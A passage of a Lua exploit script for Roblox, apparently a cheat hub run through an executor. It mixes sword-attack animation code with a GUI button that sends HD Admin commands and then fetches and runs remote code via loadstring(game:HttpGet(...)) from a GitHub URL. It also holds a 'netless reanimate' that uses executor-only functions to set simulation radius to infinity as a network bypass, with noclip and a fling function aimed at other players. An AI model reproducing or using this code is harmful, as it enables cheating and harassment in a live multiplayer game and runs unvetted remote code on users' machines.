HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(30),math.rad(-30),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
	end
	attack=false
	con1:disconnect()
end

function spin()
attack=true
con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
con2=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
for i=0,1,0.2 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
for i=0,1,1 do
so("http://roblox.com/asset/?id=231917987",Torso,1,1)
swait()
for i=0,1,0.1 do
swait()
local blcf = HitboxA.CFrame*CFrame.new(0,.5,0)
if scfr and (HitboxA.Position-scfr.p).magnitude > .1  then
local h = 5
local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,-1,-1)*angles(math.rad(-80),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,-1,-1)*angles(math.rad(-80),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,5)*euler(0,-1.5,6*i),.3)
end
end
con1:disconnect()
con2:disconnect()
attack=false
end

function kick()
attack=true
con1=LeftLeg.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
Humanoid.WalkSpeed = 0
for i=0,1,0.2 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-20),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-20),math.rad(0),math.rad(-30)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(-90),math.rad(-90),math.rad(0)),.3)
end
so("http://roblox.com/asset/?id=200632211",LeftLeg,1,1) 
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-60),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-60),math.rad(0),math.rad(-30)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(100),math.rad(-90),math.rad(0)),.3)
end
attack=false
Humanoid.WalkSpeed = 16
con1:disconnect()
end

function DualStab()
attack=true
con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
con2=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
for i=0,1,0.2 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
	so("http://www.roblox.com/asset/?id=233856146",HitboxA,1,1) 
	so("http://www.roblox.com/asset/?id=234365573",HitboxB,1,1) 
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(130),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(-130),math.rad(-90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,-1,-1)*angles(math.rad(-120),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,-1,-1)*angles(math.rad(-120),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
Torso.Velocity=Head.CFrame.lookVector*50
end
con1:disconnect()
con2:disconnect()
attack=false
end

function DualSlash()
attack=true
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(90),math.rad(50),math.rad(0)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(90),math.rad(-50),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
end
con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
con2=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
so("http://www.roblox.com/asset/?id=233856146",HitboxA,1,1) 
so("http://www.roblox.com/asset/?id=234365573",HitboxB,1,1) 
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(20),math.rad(60)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(-20),math.rad(-60)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,-1,-1)*angles(math.rad(-60),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,-1,-1)*angles(math.rad(-60),math.rad(0),math.rad(0)),.3)
end
con1:disconnect()
con2:disconnect()
attack=false
end

mouse.Button1Down:connect(function()
	if attack==false then
		if attacktype==1 then
			attack=true
			attacktype=2
			attackone()
		elseif attacktype==2 then
			attack=true
			attacktype=1
			attacktwo()
		end
	end
end)

mouse.KeyDown:connect(function(k)
	k=k:lower()
	if k=='q' then
		if attack==false then
			spin()
		end
		elseif k=='e' then
		if attack==false then
			kick()
		end
		elseif k=='r' then
		if attack==false then
			DualStab()
		end
		elseif k=='f' then
		if attack==false then
			DualSlash()
	end
	end
end)

local sine = 0
local change = 1
local val = 0

while true do
swait()
sine = sine + change
local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
local velderp=RootPart.Velocity.y
hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
if equipped==true or equipped==false then
if attack==false then
idle=idle+1
else
idle=0
end
if idle>=500 then
if attack==false then
--Sheath()
end
end
if RootPart.Velocity.y > 1 and hitfloor==nil then 
Anim="Jump"
if attack==false then
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(20),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(20),math.rad(0),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
end
elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
Anim="Fall"
if attack==false then
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-50),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-50),math.rad(0),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
end
elseif torvel<1 and hitfloor~=nil then
Anim="Idle"
if attack==false then
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(40)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-20),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(10),math.rad(20),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(-10)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
elseif torvel>2 and torvel<22 and hitfloor~=nil then
Anim="Walk"
if attack==false then
change=3
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-20),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-20),math.rad(0),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
end
elseif torvel>=22 and hitfloor~=nil then
Anim="Run"
if attack==false then
end
end
end
end
end)
Section8:NewButton("sword 4 hats requird *sometimes get lag", "r6,4458601937,4506945409,4794315940,4820152700", function()
         local A_1 = ";morph me do"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";char me char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";hat me 4458601937"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";hat me 4506945409"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";hat me 4794315940"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";hat me 4820152700"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/SwordSimIsGood/Sword-SG/main/Swords FE Starmd'))()
end)
Section8:NewButton("less fe *lags sometimes", "r6,use keyboard!", function()
    --[[
    fe nameless animations v4
    made by MyWorld#4430
    discord.gg/pYVHtSJmEY
    no hats needed, r15 supported
]]

if "wanna use myworld reanimate" then
    --reanimate by MyWorld#4430 discord.gg/pYVHtSJmEY
    local Vector3_101 = Vector3.new(1, 0, 1)
    local netless_Y = Vector3.new(0, 25.1, 0)
    local function getNetlessVelocity(realPartVelocity) --change this if you have a better method
        local mag = realPartVelocity.Magnitude
        if (mag > 1) and (mag < 100) then
            local unit = realPartVelocity.Unit
            if (unit.Y > 0.25) or (unit.Y < -0.75) then
                return realPartVelocity * (25.1 / realPartVelocity.Y)
            end
            realPartVelocity = unit * 100
        end
        return (realPartVelocity * Vector3_101) + netless_Y
    end
    local simradius = "shp" --simulation radius (net bypass) method
    --"shp" - sethiddenproperty
    --"ssr" - setsimulationradius
    --false - disable
    local noclipAllParts = false --set it to true if you want noclip
    local antiragdoll = true --removes hingeConstraints and ballSocketConstraints from your character
    local newanimate = true --disables the animate script and enables after reanimation
    local discharscripts = true --disables all localScripts parented to your character before reanimation
    local R15toR6 = true --tries to convert your character to r6 if its r15
    local hatcollide = false --makes hats cancollide (credit to ShownApe) (works only with reanimate method 0)
    local humState16 = true --enables collisions for limbs before the humanoid dies (using hum:ChangeState)
    local addtools = false --puts all tools from backpack to character and lets you hold them after reanimation
    local hedafterneck = true --disable aligns for head and enable after neck or torso is removed
    local loadtime = game:GetService("Players").RespawnTime + 0.5 --anti respawn delay
    local method = 3 --reanimation method
    --methods:
    --0 - breakJoints (takes [loadtime] seconds to laod)
    --1 - limbs
    --2 - limbs + anti respawn
    --3 - limbs + breakJoints after [loadtime] seconds
    --4 - remove humanoid + breakJoints
    --5 - remove humanoid + limbs
    local alignmode = 2 --AlignPosition mode
    --modes:
    --1 - AlignPosition rigidity enabled true
    --2 - 2 AlignPositions rigidity enabled both true and false
    --3 - AlignPosition rigidity enabled false
    local flingpart = "HumanoidRootPart" --name of the part or the hat used for flinging
    --the fling function
    --usage: fling(target, duration, velocity)
    --target can be set to: basePart, CFrame, Vector3, character model or humanoid (flings at mouse.Hit if argument not provided))
    --duration (fling time in seconds) can be set to: a number or a string convertable to the number (0.5s if not provided),
    --velocity (fling part rotation velocity) can be set to a vector3 value (Vector3.new(20000, 20000, 20000) if not provided)
    
    local lp = game:GetService("Players").LocalPlayer
    local rs = game:GetService("RunService")
    local stepped = rs.Stepped
    local heartbeat = rs.Heartbeat
    local renderstepped = rs.RenderStepped
    local sg = game:GetService("StarterGui")
    local ws = game:GetService("Workspace")
    local cf = CFrame.new
    local v3 = Vector3.new
    local v3_0 = Vector3.zero
    local inf = math.huge
    
    local c = lp.Character
    
    if not (c and c.Parent) then
    	return
    end
    
    c:GetPropertyChangedSignal("Parent"):Connect(function()
        if not (c and c.Parent) then
    	    c = nil
    	end
    end)
    
    local function gp(parent, name, className)
    	if typeof(parent) == "Instance" then
    		for i, v in pairs(parent:GetChildren()) do
    			if (v.Name == name) and v:IsA(className) then
    				return v
    			end
    		end
    	end
    	return nil
    end
    
    if type(getNetlessVelocity) ~= "function" then
        getNetlessVelocity = nil
    end
    
    local function align(Part0, Part1)
    	Part0.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
    
    	local att0 = Instance.new("Attachment")
    	att0.Orientation = v3_0
    	att0.Position = v3_0
    	att0.Name = "att0_" .. Part0.Name
    	local att1 = Instance.new("Attachment")
    	att1.Orientation = v3_0
    	att1.Position = v3_0
    	att1.Name = "att1_" .. Part1.Name
    
    	if (alignmode == 1) or (alignmode == 2) then
    		local ape = Instance.new("AlignPosition", att0)
    		ape.ApplyAtCenterOfMass = false
    		ape.MaxForce = inf
    		ape.MaxVelocity = inf
    		ape.ReactionForceEnabled = false
    		ape.Responsiveness = 200
    		ape.Attachment1 = att1
    		ape.Attachment0 = att0
    		ape.Name = "AlignPositionRtrue"
    		ape.RigidityEnabled = true
    	end
    
    	if (alignmode == 2) or (alignmode == 3) then
    		local apd = Instance.new("AlignPosition", att0)
    		apd.ApplyAtCenterOfMass = false
    		apd.MaxForce = inf
    		apd.MaxVelocity = inf
    		apd.ReactionForceEnabled = false
    		apd.Responsiveness = 200
    		apd.Attachment1 = att1
    		apd.Attachment0 = att0
    		apd.Name = "AlignPositionRfalse"
    		apd.RigidityEnabled = false
    	end
    
    	local ao = Instance.new("AlignOrientation", att0)
    	ao.MaxAngularVelocity = inf
    	ao.MaxTorque = inf
    	ao.PrimaryAxisOnly = false
    	ao.ReactionTorqueEnabled = false
    	ao.Responsiveness = 200
    	ao.Attachment1 = att1
    	ao.Attachment0 = att0
    	ao.RigidityEnabled = false
    
    	if getNetlessVelocity then
    	    local vel = Part0.Velocity
    	    local velpart = Part1
            local rsteppedcon = renderstepped:Connect(function()
                Part0.Velocity = vel
            end)
            local heartbeatcon = heartbeat:Connect(function()
                vel = Part0.Velocity
                Part0.Velocity = getNetlessVelocity(velpart.Velocity)
            end)
            local attcon = nil
            Part0:GetPropertyChangedSignal("Parent"):Connect(function()
                if not (Part0 and Part0.Parent) then
                    rsteppedcon:Disconnect()
                    heartbeatcon:Disconnect()
                    attcon:Disconnect()
                end
            end)
            attcon = att1:GetPropertyChangedSignal("Parent"):Connect(function()
    	        if not (att1 and att1.Parent) then
    	            attcon:Disconnect()
                    velpart = Part0
    	        else
    	            velpart = att1.Parent
    	            if not velpart:IsA("BasePart") then
    	                velpart = Part0
    	            end
    	        end
    	    end)
    	end
    	
    	att0.Parent = Part0
        att1.Parent = Part1
    end
    
    local function respawnrequest()
    	local ccfr = ws.CurrentCamera.CFrame
    	local c = lp.Character
    	lp.Character = nil
    	lp.Character = c
    	local con = nil
    	con = ws.CurrentCamera.Changed:Connect(function(prop)
    	    if (prop ~= "Parent") and (prop ~= "CFrame") then
    	        return
    	    end
    	    ws.CurrentCamera.CFrame = ccfr
    	    con:Disconnect()
        end)
    end
    
    local destroyhum = (method == 4) or (method == 5)
    local breakjoints = (method == 0) or (method == 4)
    local antirespawn = (method == 0) or (method == 2) or (method == 3)
    
    hatcollide = hatcollide and (method == 0)
    
    addtools = addtools and gp(lp, "Backpack", "Backpack")
    
    local fenv = getfenv()
    local shp = fenv.sethiddenproperty or fenv.set_hidden_property or fenv.set_hidden_prop or fenv.sethiddenprop
    local ssr = fenv.setsimulationradius or fenv.set_simulation_radius or fenv.set_sim_radius or fenv.setsimradius or fenv.set_simulation_rad or fenv.setsimulationrad
    
    if shp and (simradius == "shp") then
    	spawn(function()
    		while c and heartbeat:Wait() do
    			shp(lp, "SimulationRadius", inf)
    		end
    	end)
    elseif ssr and (simradius == "ssr") then
    	spawn(function()
    		while c and heartbeat:Wait() do
    			ssr(inf)
    		end
    	end)
    end
    
    antiragdoll = antiragdoll and function(v)
    	if v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
    		v.Parent = nil
    	end
    end
    
    if antiragdoll then
    	for i, v in pairs(c:GetDescendants()) do
    		antiragdoll(v)
    	end
    	c.DescendantAdded:Connect(antiragdoll)
    end
    
    if antirespawn then
    	respawnrequest()
    end
    
    if method == 0 then
    	wait(loadtime)
    	if not c then
    		return
    	end
    end
    
    if discharscripts then
    	for i, v in pairs(c:GetChildren()) do
    		if v:IsA("LocalScript") then
    			v.Disabled = true
    		end
    	end
    elseif newanimate then
    	local animate = gp(c, "Animate", "LocalScript")
    	if animate and (not animate.Disabled) then
    		animate.Disabled = true
    	else
    		newanimate = false
    	end
    end
    
    if addtools then
    	for i, v in pairs(addtools:GetChildren()) do
    		if v:IsA("Tool") then
    			v.Parent = c
    		end
    	end
    end
    
    pcall(function()
    	settings().Physics.AllowSleep = false
    	settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
    end)
    
    local OLDscripts = {}
    
    for i, v in pairs(c:GetDescendants()) do
    	if v.ClassName == "Script" then
    		table.insert(OLDscripts, v)
    	end
    end
    
    local scriptNames = {}
    
    for i, v in pairs(c:GetDescendants()) do
    	if v:IsA("BasePart") then
    		local newName = tostring(i)
    		local exists = true
    		while exists do
    			exists = false
    			for i, v in pairs(OLDscripts) do
    				if v.Name == newName then
    					exists = true
    				end
    			end
    			if exists then
    				newName = newName .. "_"    
    			end
    		end
    		table.insert(scriptNames, newName)
    		Instance.new("Script", v).Name = newName
    	end
    end
    
    c.Archivable = true
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then
    	for i, v in pairs(hum:GetPlayingAnimationTracks()) do
    		v:Stop()
    	end
    end
    local cl = c:Clone()
    if hum and humState16 then
        hum:ChangeState(Enum.HumanoidStateType.Physics)
        if destroyhum then
            wait(1.6)
        end
    end
    if hum and hum.Parent and destroyhum then
        hum:Destroy()
    end
    
    if not c then
        return
    end
    
    local head = gp(c, "Head", "BasePart")
    local torso = gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart")
    local root = gp(c, "HumanoidRootPart", "BasePart")
    if hatcollide and c:FindFirstChildOfClass("Accessory") then
        local anything = c:FindFirstChildOfClass("BodyColors") or gp(c, "Health", "Script")
        if not (torso and root and anything) then
            return
        end
        torso:Destroy()
        root:Destroy()
        if shp then
            for i,v in pairs(c:GetChildren()) do
                if v:IsA("Accessory") then
                    shp(v, "BackendAccoutrementState", 0)
                end 
            end
        end
        anything:Destroy()
    end
    
    local model = Instance.new("Model", c)
    model.Name = model.ClassName
    
    model:GetPropertyChangedSignal("Parent"):Connect(function()
        if not (model and model.Parent) then
    	    model = nil
        end
    end)
    
    for i, v in pairs(c:GetChildren()) do
    	if v ~= model then
    		if addtools and v:IsA("Tool") then
    			for i1, v1 in pairs(v:GetDescendants()) do
    				if v1 and v1.Parent and v1:IsA("BasePart") then
    					local bv = Instance.new("BodyVelocity", v1)
    					bv.Velocity = v3_0
    					bv.MaxForce = v3(1000, 1000, 1000)
    					bv.P = 1250
    					bv.Name = "bv_" .. v.Name
    				end
    			end
    		end
    		v.Parent = model
    	end
    end
    
    if breakjoints then
    	model:BreakJoints()
    else
    	if head and torso then
    		for i, v in pairs(model:GetDescendants()) do
    			if v:IsA("Weld") or v:IsA("Snap") or v:IsA("Glue") or v:IsA("Motor") or v:IsA("Motor6D") then
    				local save = false
    				if (v.Part0 == torso) and (v.Part1 == head) then
    					save = true
    				end
    				if (v.Part0 == head) and (v.Part1 == torso) then
    					save = true
    				end
    				if save then
    					if hedafterneck then
    						hedafterneck = v
    					end
    				else
    					v:Destroy()
    				end
    			end
    		end
    	end
    	if method == 3 then
    		spawn(function()
    			wait(loadtime)
    			if model then
    				model:BreakJoints()
    			end
    		end)
    	end
    end
    
    cl.Parent = c
    for i, v in pairs(cl:GetChildren()) do
    	v.Parent = c
    end
    cl:Destroy()
    
    local noclipmodel = (noclipAllParts and c) or model
    local noclipcon = nil
    local function uncollide()
    	if noclipmodel then
    		for i, v in pairs(noclipmodel:GetDescendants()) do
    		    if v:IsA("BasePart") then
    			    v.CanCollide = false
    		    end
    		end
    	else
    		noclipcon:Disconnect()
    	end
    end
    noclipcon = stepped:Connect(uncollide)
    uncollide()
    
    for i, scr in pairs(model:GetDescendants()) do
    	if (scr.ClassName == "Script") and table.find(scriptNames, scr.Name) then
    		local Part0 = scr.Parent
    		if Part0:IsA("BasePart") then
    			for i1, scr1 in pairs(c:GetDescendants()) do
    				if (scr1.ClassName == "Script") and (scr1.Name == scr.Name) and (not scr1:IsDescendantOf(model)) then
    					local Part1 = scr1.Parent
    					if (Part1.ClassName == Part0.ClassName) and (Part1.Name == Part0.Name) then
    						align(Part0, Part1)
    						scr:Destroy()
    						scr1:Destroy()
    						break
    					end
    				end
    			end
    		end
    	end
    end
    
    for i, v in pairs(c:GetDescendants()) do
    	if v and v.Parent and (not v:IsDescendantOf(model)) then
    		if v:IsA("Decal") then
    		    v.Transparency = 1
    		elseif v:IsA("BasePart") then
    			v.Transparency = 1
    			v.Anchored = false
    		elseif v:IsA("ForceField") then
    			v.Visible = false
    		elseif v:IsA("Sound") then
    			v.Playing = false
    		elseif v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
    			v.Enabled = false
    		end
    	end
    end
    
    if newanimate then
    	local animate = gp(c, "Animate", "LocalScript")
    	if animate then
    		animate.Disabled = false
    	end
    end
    
    if addtools then
    	for i, v in pairs(c:GetChildren()) do
    		if v:IsA("Tool") then
    			v.Parent = addtools
    		end
    	end
    end
    
    local hum0 = model:FindFirstChildOfClass("Humanoid")
    if hum0 then
        hum0:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (hum0 and hum0.Parent) then
                hum0 = nil
            end
        end)
    end
    
    local hum1 = c:FindFirstChildOfClass("Humanoid")
    if hum1 then
        hum1:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (hum1 and hum1.Parent) then
                hum1 = nil
            end
        end)
        
    	ws.CurrentCamera.CameraSubject = hum1
    	local camSubCon = nil
    	local function camSubFunc()
    		camSubCon:Disconnect()
    		if c and hum1 then
    			ws.CurrentCamera.CameraSubject = hum1
    		end
    	end
    	camSubCon = renderstepped:Connect(camSubFunc)
    	if hum0 then
    		hum0:GetPropertyChangedSignal("Jump"):Connect(function()
    			if hum1 then
    				hum1.Jump = hum0.Jump
    			end
    		end)
    	else
    		respawnrequest()
    	end
    end
    
    local rb = Instance.new("BindableEvent", c)
    rb.Event:Connect(function()
    	rb:Destroy()
    	sg:SetCore("ResetButtonCallback", true)
    	if destroyhum then
    		c:BreakJoints()
    		return
    	end
    	if hum0 and (hum0.Health > 0) then
    		model:BreakJoints()
    		hum0.Health = 0
    	end
    	if antirespawn then
    	    respawnrequest()
    	end
    end)
    sg:SetCore("ResetButtonCallback", rb)
    
    spawn(function()
    	while c do
    		if hum0 and hum1 then
    			hum1.Jump = hum0.Jump
    		end
    		wait()
    	end
    	sg:SetCore("ResetButtonCallback", true)
    end)
    
    R15toR6 = R15toR6 and hum1 and (hum1.RigType == Enum.HumanoidRigType.R15)
    if R15toR6 then
        local part = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "UpperTorso", "BasePart") or gp(c, "LowerTorso", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
    	if part then
    	    local cfr = part.CFrame
    		local R6parts = { 
    			head = {
    				Name = "Head",
    				Size = v3(2, 1, 1),
    				R15 = {
    					Head = 0
    				}
    			},
    			torso = {
    				Name = "Torso",
    				Size = v3(2, 2, 1),
    				R15 = {
    					UpperTorso = 0.2,
    					LowerTorso = -0.8
    				}
    			},
    			root = {
    				Name = "HumanoidRootPart",
    				Size = v3(2, 2, 1),
    				R15 = {
    					HumanoidRootPart = 0
    				}
    			},
    			leftArm = {
    				Name = "Left Arm",
    				Size = v3(1, 2, 1),
    				R15 = {
    					LeftHand = -0.849,
    					LeftLowerArm = -0.174,
    					LeftUpperArm = 0.415
    				}
    			},
    			rightArm = {
    				Name = "Right Arm",
    				Size = v3(1, 2, 1),
    				R15 = {
    					RightHand = -0.849,
    					RightLowerArm = -0.174,
    					RightUpperArm = 0.415
    				}
    			},
    			leftLeg = {
    				Name = "Left Leg",
    				Size = v3(1, 2, 1),
    				R15 = {
    					LeftFoot = -0.85,
    					LeftLowerLeg = -0.29,
    					LeftUpperLeg = 0.49
    				}
    			},
    			rightLeg = {
    				Name = "Right Leg",
    				Size = v3(1, 2, 1),
    				R15 = {
    					RightFoot = -0.85,
    					RightLowerLeg = -0.29,
    					RightUpperLeg = 0.49
    				}
    			}
    		}
    		for i, v in pairs(c:GetChildren()) do
